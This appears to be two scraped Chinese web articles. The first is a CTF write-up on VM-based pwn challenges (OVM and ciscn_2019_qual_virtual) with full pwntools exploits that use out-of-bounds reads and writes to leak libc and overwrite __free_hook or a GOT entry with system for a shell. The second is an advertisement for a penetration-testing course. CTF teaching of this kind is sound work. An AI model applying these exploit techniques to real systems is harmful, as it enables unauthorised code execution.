@@ -1,0 +1,302 @@
+➜vm-pwn入门
+http://www.sohu.com/a/419942922_99907709	10383
+<p>文章共计2761个词</p>
+<p>预计阅读7分钟</p>
+<h1>引言</h1>
+<p>之前一直没去了解过vm-pwn，做一些题目对vm-pwn进行一个大体上的了解，算是入门。 </p>
+<p>前置知识</p>
+<ul>
+<li>对指令有过了解</li>
+<li>有耐心(感觉vm程序的代码量有点大)</li>
+</ul>
+<p>[OGeek2019 Final]OVM</p>
+<p>检测保护</p>
+<p>canary 没开启 </p>
+<p class="ql-align-center"><img src="http://p1.itc.cn/q_70/images03/20200922/721500c51f584defa78dbca65d501681.png" max-width="600" /></p>
+<p>ida分析main函数</p>
+<p class="ql-align-center"><img src="http://p7.itc.cn/q_70/images03/20200922/3d740cb8f7174b819e7079dca56705d7.png" max-width="600" /></p>
+<p>fetch函数</p>            <div class="lookall-box">
+<div class="lookall-shadow"></div>
+<section class="lookall">
+<a href="javascript:;" class="show-all" id="showMore">
+<em>展开全文</em>
+</a>
+</section>
+</div>
+<div class="hidden-content control-hide">
+<p>fetch函数较为简单，即取出pc值，以pc值作为下标返回指定的指令</p>
+<p class="ql-align-center"><img src="http://p3.itc.cn/q_70/images03/20200922/34bd4ee9b46c4895bc9db4f909205518.png" max-width="600" /></p>
+<p>execute函数</p>
+<p class="ql-align-center"><img src="http://p0.itc.cn/q_70/images03/20200922/2ee4f4cfee9f4f7a8a85330aff3313fa.png" max-width="600" /></p>
+<p>可以看到指令是由几个部分组成的，其实 execute 函数就是一个指令表，我们通过指令表输入相应的指令就可以完成相应的操作。 </p>
+<p><strong>指令表</strong></p>
+<p>操作码|操作数1|操作数2|操作数3</p>
+<p>op|num1 |num2 |num3</p>
+<p>---------------------------</p>
+<p>操作码</p>
+<p>0x70: reg[num1] = reg[num3]+reg[num2] | add指令</p>
+<p>0xB0: reg[num1] = reg[num3]^reg[num2] | 异或指令</p>
+<p>0xD0: reg[num1] = reg[num2]&gt;&gt;reg[num3] | 右移指令</p>
+<p>0xFF: 若reg[13]为0，则退出，否则打印指令集</p>
+<p>0xC0: reg[num1] = reg[num2] &lt;&lt; reg[num3] | 左移指令</p>
+<p>0x90: reg[num1] = reg[num3] &amp; reg[num2] |与指令</p>
+<p>0xA0: reg[num1] = reg[num3] | reg[num2] |或指令</p>
+<p>0x80: reg[num1] = reg[num2] - reg[num3] | sub指令</p>
+<p>0x30: reg[num1] = memory[reg[num3]] | mov reg memory 指令</p>
+<p>0x50: stack[op] = reg[num1] | push指令</p>
+<p>0x60: reg[num1] = stack[reg[13]] | pop指令</p>
+<p>0x40: memory[reg[num3]] = reg[num1] mov memory reg 指令</p>
+<p>0x10：reg[num1] = v2(最低位) | set指令</p>
+<p>0x20: reg[num1] = v2 ==0</p>
+<p>其中漏洞点在于两条指令，由于数组的下标没有进行限制，则会产生数组越界的情况。则造成了任意地址写和任意地址读的情况。</p>
+<p>0x30: reg[num1] = memory[reg[num3]] | mov reg memory 指令 //任意地址读</p>
+<p>0x40: memory[reg[num3]] = reg[num1] mov memory reg 指令 //任意地址写</p>
+<p>采用 movsxd 指令进行下标的转移， movsxd 是进行符号填充再进行转移，即数组的下标是有符号数。 </p>
+<p class="ql-align-center"><img src="http://p6.itc.cn/q_70/images03/20200922/6294ccc6512e478fa640c05227311027.png" max-width="600" /></p>
+<p>可以看到用于保存指令的 memory 以及用于寄存器存储的 reg 的地址都比 got 表的地址大，那么大数组的下标为负数时，即可越界读取 got 表内的地址，完成基地址的泄露 </p>
+<p class="ql-align-center"><img src="//p8.itc.cn/q_70/images03/20200922/6830f7b6041b40e0a185a66315af6f46.png" max-width="600" /></p>
+<p>思路</p>
+<ul>
+<li>首先程序再结束时，会往 comment[0] 的内容作为地址写入，然后将 comment[0] 给free掉，那么可以将 comment[0] 的内容修改为 free_hook-4 ，此时可以将 free_hook-4 修改为 /bin/shx00 ， free_hook 修改为 system 从而获得shell</li>
+<li>由于需要将 commnet[0] 修改为 free_hook-4 ，那么首先需要泄露 libc_base 的地址，由于读取操作没有对下标进行限制，因此进行任意地址读，读取 got 表项的内容，泄露 libc 的地址</li>
+<li>将读取得到 libc 地址，利用指令表的算数运算求得 free_hook-4 的地址，利用写操作没有对下标进行限制，进行任意地址写，往 comment[0] 内写入 free_hook-4 的地址</li>
+</ul>
+<p>#step1 读取got表项内容</p>
+<p>0x100a0001, #set指令，将r10设置为1</p>
+<p>0x100b0009, #set指令，将r11设置为9</p>
+<p>0xc00a0a0b, #左移指令，r10为1&lt;&lt;9=0x200</p>
+<p>0x10010001, #set 将r1设置为1</p>
+<p>0x10020006, #set 将r2设置为6</p>
+<p>0xc0030102, #左移 r3=1&lt;&lt;6=0x40 </p>
+<p>0x10010004, #set r1=4</p>
+<p>0x10000006, #set r0=6</p>
+<p>0x70030301, #add r3=0x40+4=0x44</p>
+<p>0x80040003, #sub r4=6-0x44=-0x3e,got表项</p>
+<p>0x30050004, #read 将got表项内容读到r5,这里注意一次只能读取4个字节，因此还要在读一次</p>
+<p>0x7004040d, #将下标+1</p>
+<p>0x30060004, #读取剩下的4个字节</p>
+<p>解释一下 -0x3e ，我们找到需要泄露的 got 表项的地址，与 memory 地址相减，然后要除以 4 ，因为这个值为数组的下标，而数组的大小为 int 型，因此要除以4，即可求出目标地址的下标值 </p>
+<p class="ql-align-center"><img src="http://p7.itc.cn/q_70/images03/20200922/ecbad7ebbde34ca7bb6a5e9141ec56fe.png" max-width="600" /></p>
+<p>#step2 往commnet[0]写入</p>
+<p>由于以及泄露出got表现的地址，该地址与 free_hook-4 的地址相对偏移是不变的，因此就需要利用指令表的指令进行算数运算求出 free_hook-4 的地址即可，接着再次利用数组越界将 free_hook-4 写入 comment[0] 即可 </p>
+<p>0x10000003,</p>
+<p>0x1001000f,</p>
+<p>0xc0000001,</p>
+<p>0x10010005,</p>
+<p>0xc0000001,</p>
+<p>0x10020004,</p>
+<p>0x1001000f,</p>
+<p>0xc0020201,</p>
+<p>0x10010001,</p>
+<p>0xc0020201,</p>
+<p>0x70000002,</p>
+<p>0x1001000c,</p>
+<p>0x10020002,</p>
+<p>0xc0020201,</p>
+<p>0x70000002,</p>
+<p>0x10010008,</p>
+<p>0x10020002,</p>
+<p>0xc0020201,</p>
+<p>0x70000002,</p>
+<p>0x10010004,</p>
+<p>0x1002000b,</p>
+<p>0xc0020201,</p>
+<p>0x70000002,</p>
+<p>0x70050500,</p>
+<p>0x10000000,</p>
+<p>0x10010008,</p>
+<p>0x80000001, #计算出comment[0]的下标</p>
+<p>0x40050000, #将free_hook-4的低四字节写进comment[0]</p>
+<p>0x10010001,</p>
+<p>0x70000001,</p>
+<p>0x40060000, #写入剩余的4个字节</p>
+<p>0xff000000 #打印寄存器内容</p>
+<p>完整exp</p>
+<p>from pwn import *</p>
+<p>libc = ELF( "libc.so.6") </p>
+<p>context(arch= 'amd64',os= 'linux') </p>
+<p>sh = process( "./pwn") </p>
+<p>#sh = remote("node3.buuoj.cn",26699)</p>
+<p>free_hook = libc.symbols[ '__free_hook'] </p>
+<p>print'free_hook:'+ hex(free_hook) </p>
+<p>code = [</p>
+<p>0x100a0001, #set指令，将r10设置为1</p>
+<p>0x100b0009, #set指令，将r11设置为9</p>
+<p>0xc00a0a0b, #左移指令，r10为1&lt;&lt;9=0x200</p>
+<p>0x10010001, #set 将r1设置为1</p>
+<p>0x10020006, #set 将r2设置为6</p>
+<p>0xc0030102, #左移 r3=1&lt;&lt;6=0x40 </p>
+<p>0x10010004, #set r1=4</p>
+<p>0x10000006, #set r0=6</p>
+<p>0x70030301, #add r3=0x40+4=0x44</p>
+<p>0x80040003, #sub r4=6-0x44=-0x3e,got表项</p>
+<p>0x30050004, #read 将got表项内容读到r5,这里注意一次只能读取4个字节，因此还要在读一次</p>
+<p>0x7004040d, #将下标+1</p>
+<p>0x30060004, #读取剩下的4个字节</p>
+<p>0x10000003, </p>
+<p>0x1001000f, </p>
+<p>0xc0000001, </p>
+<p>0x10010005, </p>
+<p>0xc0000001, </p>
+<p>0x10020004, </p>
+<p>0x1001000f, </p>
+<p>0xc0020201, </p>
+<p>0x10010001, </p>
+<p>0xc0020201, </p>
+<p>0x70000002, </p>
+<p>0x1001000c, </p>
+<p>0x10020002, </p>
+<p>0xc0020201, </p>
+<p>0x70000002, </p>
+<p>0x10010008, </p>
+<p>0x10020002, </p>
+<p>0xc0020201, </p>
+<p>0x70000002, </p>
+<p>0x10010004, </p>
+<p>0x1002000b, </p>
+<p>0xc0020201, </p>
+<p>0x70000002, </p>
+<p>0x70050500, </p>
+<p>0x10000000, </p>
+<p>0x10010008, </p>
+<p>0x80000001, #计算出comment[0]的下标</p>
+<p>0x40050000, #将free_hook-4的低四字节写进comment[0]</p>
+<p>0x10010001, </p>
+<p>0x70000001, </p>
+<p>0x40060000, #写入剩余的4个字节</p>
+<p>0xff000000#打印寄存器内容</p>
+<p>]</p>
+<p>sh.recvuntil( "PC:") </p>
+<p>sh.sendline(str( 0)) </p>
+<p>sh.recvuntil( "SP:") </p>
+<p>sh.sendline(str( 1)) </p>
+<p>sh.recvuntil( "CODE SIZE:") </p>
+<p>sh.sendline(str(len(code)))</p>
+<p>sh.recvuntil( "CODE: ") </p>
+<p>fori in code: </p>
+<p>sleep( 0. 1) </p>
+<p>sh.sendline(str(i))</p>
+<p>sh.recvuntil( "R5: ") </p>
+<p>addr1 = sh.recv( 8) </p>
+<p>print'addr1:'+addr1 </p>
+<p>sh.recvuntil( "R6: ") </p>
+<p>addr2 = sh.recv( 4) </p>
+<p>print'addr2:'+addr2 </p>
+<p>addr = int( '0x'+addr2+addr1, 16) </p>
+<p>print'addr:'+ hex(addr) </p>
+<p>libc_base = addr - 0x3c67a0</p>
+<p>system= libc_base + libc.symbols[ 'system'] </p>
+<p>print'system:'+ hex( system) </p>
+<p>sh.recvuntil( "OVM?") </p>
+<p>payload = '/bin/shx00'+p64( system) </p>
+<p>attach(sh)</p>
+<p>sh.send(payload)</p>
+<p>sh.interactive</p>
+<p>ciscn_2019_qual_virtual</p>
+<p>检测保护</p>
+<p class="ql-align-center"><img src="//p9.itc.cn/q_70/images03/20200922/ac0feb784bd64f43befd0fa50ede5cd9.png" max-width="600" /></p>
+<p>ida分析main函数</p>
+<p>程序开始开辟了三个空间，用于存放指令，数据，以及用于操作的数据空间。</p>
+<p class="ql-align-center"><img src="http://p1.itc.cn/q_70/images03/20200922/1b641b41c9d24df68a3f790fb8f5a3f4.png" max-width="600" /></p>
+<p>指令表</p>
+<p>指令间是通过分隔符执行分隔的，分隔符有 nrt 存进了名为 delim 的变量， strtok 是根据分隔符将字符串分割出来，就是为了区分我们输入的指令。指令是采用字符串进行输入的。 </p>
+<p class="ql-align-center"><img src="http://p7.itc.cn/q_70/images03/20200922/e636ece67d0d4f48bcb08906b52d9b04.png" max-width="600" /></p>
+<p>execute</p>
+<p>在执行指令的函数里，具体的指令操作没有反编译出来，我们需要动态调试将指令具体的操作的函数偏移调试出来。</p>
+<p class="ql-align-center"><img src="http://p4.itc.cn/q_70/images03/20200922/55894e77bf9a44bab18791a11e3d6c52.png" max-width="600" /></p>
+<p>将断点断在跳转时，因为 rax 是通过动态赋值的，因此ida不能分析出具体跳转的函数 </p>
+<p class="ql-align-center"><img src="http://p5.itc.cn/q_70/images03/20200922/601d191212a54d4489c6a6f05ebbd32d.png" max-width="600" /></p>
+<p>进入gdb进行动态调试</p>
+<p class="ql-align-center"><img src="http://p0.itc.cn/q_70/images03/20200922/73a0e93a110f4717b7ba679778da34f0.png" max-width="600" /></p>
+<p>输入你需要查找的指令</p>
+<p class="ql-align-center"><img src="http://p9.itc.cn/q_70/images03/20200922/577bda593ce8496e91d90a46a61d9864.png" max-width="600" /></p>
+<p>查看此时 rax 的值 </p>
+<p class="ql-align-center"><img src="http://p0.itc.cn/q_70/images03/20200922/dfb6b6a9ee024de480135b48fd4783f1.png" max-width="600" /></p>
+<p>在ida内，G键输入跳转，输入 rax 的值 </p>
+<p class="ql-align-center"><img src="http://p1.itc.cn/q_70/images03/20200922/3ec939b0e117460c88619cc2bab9e623.png" max-width="600" /></p>
+<p>可以发现这里会调用一个函数，这个函数就是 save 指令的操作，其余指令的操作也可以这样调试出来，就不一一演示了。 </p>
+<p class="ql-align-center"><img src="http://p9.itc.cn/q_70/images03/20200922/60364b5ed591491ab2bb295f50c77b4e.png" max-width="600" /></p>
+<p>save</p>
+<p>save 函数就是从运行栈的栈顶中取出两个值，一个值作为下标，另一个作为值进行赋值，很显然是一个任意地址写的功能，因为下标的值没有进行限制，因此存在一个数组越界。 </p>
+<p class="ql-align-center"><img src="http://p4.itc.cn/q_70/images03/20200922/460691a084744520aab8141c3a9cca88.png" max-width="600" /></p>
+<p>load</p>
+<p>存在一个任意地址写，按照套路，就应该存在一个任意地址读，我们来看下 load 函数， load 函数就是从运行栈的栈顶取出一个值作为下标，并且将该下标的值存入运行栈中，位于运行栈的栈顶。通用存在数组越界 </p>
+<p class="ql-align-center"><img src="http://p2.itc.cn/q_70/images03/20200922/cdec142ab0824696b763465e29fa4c10.png" max-width="600" /></p>
+<p>思路</p>
+<ul>
+<li>程序没有开启 got 表的保护，可以修改 puts 函数的 got 表项为 system</li>
+<li>通过 load 函数的数组越界漏洞读取 libc 的值</li>
+<li>通过 save 函数的数组越界漏洞将 system 写入 puts 函数的 got 表项</li>
+<li>在执行 puts(s) 时触发 system</li>
+</ul>
+<p>完整exp</p>
+<p class="ql-align-justify">from pwn import *</p>
+<p class="ql-align-justify">libc = ELF("libc.so.6")</p>
+<p class="ql-align-justify">#sh = process("./pwn")</p>
+<p class="ql-align-justify">sh = remote("node3.buuoj.cn",26845)</p>
+<p class="ql-align-justify">puts_got = 0x404020</p>
+<p class="ql-align-justify">sh.recvuntil("name:")</p>
+<p class="ql-align-justify">sh.sendline("/bin/sh\x00")</p>
+<p class="ql-align-justify">sh.recvuntil("instruction:")</p>
+<p class="ql-align-justify">payload= 'push push load push sub div load push add '</p>
+<p class="ql-align-justify">payload+= 'push push load push sub div save '</p>
+<p class="ql-align-justify">sh.sendline(payload) </p>
+<p class="ql-align-justify">sh.recvuntil("data:")</p>
+<p class="ql-align-justify">payload = str(8)+' '</p>
+<p class="ql-align-justify">payload += str(-4)+' '</p>
+<p class="ql-align-justify">payload += str(puts_got+8)+' '</p>
+<p class="ql-align-justify">payload += str(-0x2a300)+' '</p>
+<p class="ql-align-justify">payload += str(8)+' '</p>
+<p class="ql-align-justify">payload += str(-5)+' '</p>
+<p class="ql-align-justify">payload += str(puts_got+8)+' '</p>
+<p class="ql-align-justify">#attach(sh)</p>
+<p class="ql-align-justify">sh.sendline(payload)</p>
+<p class="ql-align-justify">sh.interactive()</p>
+➜年薪30W起，大厂抢着要的岗位有多香！
+http://www.sohu.com/a/419723430_99907709	10475
+<p>7月9日，麦可思发布了《2020年中国大学生就业报告》（以下简称 《报告》）。《报告》显示，在“2019届本科毕业生半年后月收入排名前10位的专业”信息中，信息安全专业蝉联3年高薪、高就业“绿牌”专业。</p>
+<p style="text-align: center;">本科、高职“绿牌”专业</p>
+<p style="text-align: center;">↓↓↓</p>
+<p class="ql-align-center"><img src="http://p9.itc.cn/q_70/images03/20200921/fef8e18c73554ff98bcbd922dc2172f1.png" max-width="600" /></p>
+<p><strong><span style="font-size: 16px;">绿牌专业</span></strong>：指的是失业量较小，就业率、薪资和就业满意度综合较高的专业，为需求增长型专业。</p>
+<p><strong>网络安全形式面临前所未有的挑战</strong></p>
+<p>随着大安全时代的来临以及电商、人工智能、大数据、云计算、区块链等新兴技术的落地与应用，新的网络攻击形式屡见不鲜，其隐蔽性也变得更高，造成的破坏更严重，这也使得我国网络安全面临着前所未有的挑战。拿阿里巴巴去年双十一举例，2684 亿交易额的背后，是一天内 22 亿次的黑产攻击。更不用提近几年层出不穷的安全事件了，比如数据库资料被窃取、删除；服务器遭受入侵，用户帐号被盗；用户资料被修改、被钓鱼、勒索病毒等等。</p>
+<p>面对严峻的网络安全形势，对网络安全专业人才的需求进一步加大，对安全从业者的专业素养也提出了更高要求。而与网络安全人才需求量逐年递增局面相反的是，<strong>很多企业面临“招不到人”、“找不到人”的困境，安全专业人才特别是渗透测试人才缺口巨大，就业率也有保证。</strong></p>
+<p>有这样一个现象，虽然大家都说今年“互联网寒冬”来了，工作不好找，但渗透测试却高薪难聘，像华为、字节跳动等大厂长期都高薪在招。 </p>
+<p class="ql-align-center"><img src="http://p2.itc.cn/q_70/images03/20200921/521b1efc432e42eb8356a5315f2f4e64.png" max-width="600" /></p>            <div class="lookall-box">
+<div class="lookall-shadow"></div>
+<section class="lookall">
+<a href="javascript:;" class="show-all" id="showMore">
+<em>展开全文</em>
+</a>
+</section>
+</div>
+<div class="hidden-content control-hide">
+<p class="ql-align-center"><img src="http://p5.itc.cn/q_70/images03/20200921/3121d86e0a7c496b8de74273cedd5153.png" max-width="600" /></p>
+<p><strong>这也是为什么很多人“半路出家”去做渗透测试。</strong></p>
+<p>但大多数半路出家做渗透测试的同学，都独自“摸着石头过河”，没人带，缺乏系统的学习路径，走了不少弯路，职业发展速度远远比不上那些有专业沉淀的人。</p>
+<p>为了帮助致力于在「<strong><span style="font-size: 16px;">渗透测试</span></strong>」路径中深扎的同学更有方向、更有方法地成长，我们开设了——《渗透测试工程师训练营》的课程，课程自开展以来，得到了学员们的一致好评！</p>
+<p class="ql-align-center"><img src="http://p4.itc.cn/q_70/images03/20200921/d867138eb81641a592981cce3c8b232e.jpeg" max-width="600" /></p>
+<p class="ql-align-center"><img src="http://p4.itc.cn/q_70/images03/20200921/c2b6d0eaddac476abf7aff344d3a3eb4.jpeg" max-width="600" /></p>
+<p class="ql-align-center"><img src="http://p8.itc.cn/q_70/images03/20200921/1cf16c13ebb849f19f311d9c41c6dbdc.jpeg" max-width="600" /></p>
+<p class="ql-align-center"><img src="http://p0.itc.cn/q_70/images03/20200921/b8f34e27e3d34926b4b2eb1e37ae2311.jpeg" max-width="600" /></p>
+<p class="ql-align-center"><img src="http://p2.itc.cn/q_70/images03/20200921/ab772ab2fe144cec92ff62caa3999964.png" max-width="600" /></p>
+<p>左右滑动查看更多</p>
+<p style="text-align: center;">👆通过我们就业内推找到了满意的工作 </p>
+<p style="text-align: center;">小课教学、在学习期间挣回了学费 </p>
+<p style="text-align: center;">一次付费，永久可学👆 </p>
+<p>现在报名可享受 早鸟优惠价。 </p>
+<p><strong>接下来，不妨为你介绍这门课程凭什么可以帮你转行/入门Web安全，并找到一份靠谱的好工作！</strong></p>
+<p class="ql-align-center"><img src="http://p0.itc.cn/q_70/images03/20200921/1e78dc72b1dc436a986c421965e13381.jpeg" max-width="600" /></p>
+<p><strong>这可能是业内为数不多的渗透测试岗位培养课程</strong></p>
+<p>其他的“渗透测试”类课程：要么只教你单点的知识技能，要么偏向理论学习，很难做到学完就能胜任渗透测试工程师岗位工作。</p>
+<p>本门课程：合天网安学院针对上百家企业的渗透测试工程师岗位做了深度调研， 发现招聘方往往需要渗透测试工程师具备以下能力——</p>
+<p>能够熟知常见的各种渗透测试方法、工具和手段，并加以应用； </p>
+<p>能够独立地利用各种手段来检测企业的网络策略，发现企业存在的网络安全隐患问题 </p>
+<p>能够结合特定公司或项目的特性，跟踪各类安全动态，进行安全漏洞分析、预警并提出合理的网络安全解决方案。 </p>
+<p>基于此，我们产出了针对性的课程内容，核心目的只有一个： <strong>帮你学会渗透测试核心技能，从而成为一名优秀的渗透测试工程师</strong>。 </p>
+<p>详细课程体系如下 </p>
+<p class="ql-align-center"><img src="http://p8.itc.cn/q_70/images03/20200921/4e4218bb9b644a05aadc0c53a9bb3833.jpeg" max-width="600" /></p>
+<p class="ql-align-center"><img src="http://p8.itc.cn/q_70/images03/20200921/abba1222db3c4a5c8ee903eebafb91c2.jpeg" max-width="600" /></p>
+<p>以上，就是关于《渗透测试工程师训练营》课程的一些基本介绍。本次课程的课程周期将为3个月，其中，前10周进行高强度课程学习和实操训练，最后1周进行毕业综合技能实战考核和简历辅导，后续半年内，我们将持续提供课程内容答疑+各种就业推荐服务。 </p>
+<p>最后，<strong>有意向报名的同学，抢座报名吧！早鸟价倒计时8天——10月15日晚20:00准时开课！</strong>快扫码抢购吧，错过这次，又要等（浪费）3个月啦！</p>
